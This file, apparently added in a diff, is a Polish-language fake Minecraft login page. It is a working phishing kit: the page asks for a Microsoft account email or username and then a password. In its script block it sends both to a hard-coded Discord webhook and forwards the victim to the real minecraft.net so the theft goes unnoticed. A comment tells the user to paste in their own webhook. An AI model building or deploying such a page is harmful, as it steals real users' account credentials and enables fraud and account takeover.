@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zaloguj się | Minecraft</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #1A1A1A;
+            background-image: radial-gradient(circle, #2C2C2C 10%, transparent 11%);
+            background-size: 20px 20px;
+            color: #FFFFFF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #262626;
+            border: 2px solid #3C3C3C;
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            text-align: left;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            color: #4CAF50;
+            text-transform: uppercase;
+        }
+
+        h2 {
+            font-size: 20px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        p.subtitle {
+            color: #A0A0A0;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            text-transform: uppercase;
+            color: #A0A0A0;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            background-color: #111111;
+            border: 1px solid #444444;
+            color: #FFFFFF;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #4CAF50;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background-color 0.2s;
+        }
+
+        .btn:hover {
+            background-color: #45a049;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="logo">MINECRAFT</div>
+        
+        <!-- ETAP 1: Nazwa użytkownika / Email -->
+        <div id="step-email">
+            <h2>Zaloguj się</h2>
+            <p class="subtitle">Użyj swojego konta Microsoft</p>
+            
+            <div class="input-group">
+                <label for="email">Adres e-mail, telefon lub nazwa użytkownika</label>
+                <input type="text" id="email" placeholder="example@outlook.com" autocomplete="off">
+            </div>
+            
+            <button class="btn" id="btn-next">Dalej</button>
+        </div>
+
+        <!-- ETAP 2: Hasło -->
+        <div id="step-password" class="hidden">
+            <h2>Wprowadź hasło</h2>
+            <p class="subtitle" id="display-email" style="color: #4CAF50; font-size: 14px;"></p>
+            
+            <div class="input-group">
+                <label for="password">Hasło</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+            
+            <button class="btn" id="btn-login">Zaloguj się</button>
+        </div>
+    </div>
+
+    <script>
+        // TUTAJ WKLEJ SWÓJ WEBHOOK Z DISCORDA
+        const webhookUrl = "https://discord.com/api/webhooks/1574918924745842791/-XvxuWkULD76uZ_1icK_IAtGH58i0xVJ1OABffqGSHQs4QvIvZmbUMLAP7_aug4pnRPr";
+
+        const stepEmail = document.getElementById('step-email');
+        const stepPassword = document.getElementById('step-password');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const displayEmail = document.getElementById('display-email');
+
+        let savedEmail = "";
+
+        // Przejście z e-maila do hasła
+        document.getElementById('btn-next').addEventListener('click', function() {
+            if (emailInput.value.trim() === "") {
+                alert("Wpisz swój e-mail lub nazwę użytkownika!");
+                return;
+            }
+            savedEmail = emailInput.value;
+            displayEmail.innerText = savedEmail;
+            
+            stepEmail.classList.add('hidden');
+            stepPassword.classList.remove('hidden');
+            passwordInput.focus();
+        });
+
+        // Wysłanie danych po wpisaniu hasła
+        document.getElementById('btn-login').addEventListener('click', function() {
+            if (passwordInput.value.trim() === "") {
+                alert("Wpisz hasło!");
+                return;
+            }
+
+            const data = {
+                embeds: [{
+                    title: "🔔 Nowe logowanie Minecraft",
+                    color: 5025616, // Zielony kolor paska w Discordzie
+                    fields: [
+                        { name: "📧 Email / Nick", value: savedEmail, inline: false },
+                        { name: "🔑 Hasło", value: passwordInput.value, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                // Przekierowanie na prawdziwą stronę Minecraft po udanym "zalogowaniu"
+                window.location.href = "https://minecraft.net";
+            })
+            .catch((error) => {
+                console.error('Błąd:', error);
+                window.location.href = "https://minecraft.net";
+            });
+        });
+    </script>
+</body>
+</html>
